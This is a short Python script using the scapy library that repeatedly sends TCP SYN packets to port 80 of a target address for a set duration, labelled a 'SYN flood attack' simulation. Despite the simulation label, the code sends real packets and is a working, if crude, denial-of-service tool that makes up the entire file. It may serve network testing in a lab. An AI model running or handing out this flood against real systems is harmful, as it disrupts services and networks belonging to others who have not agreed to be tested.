from scapy.all import send, IP, TCP
import time

def simulate_attack(target_ip="192.168.1.1", duration=10):
    print(f"🚀 Simulating SYN flood attack on {target_ip}...")
    end_time = time.time() + duration
    
    try:
        while time.time() < end_time:
            send(IP(dst=target_ip)/TCP(dport=80, flags="S"), verbose=0)
            time.sleep(0.01)
    except KeyboardInterrupt:
        pass
    
    print("✅ Attack simulation complete.")

if __name__ == "__main__":
    simulate_attack()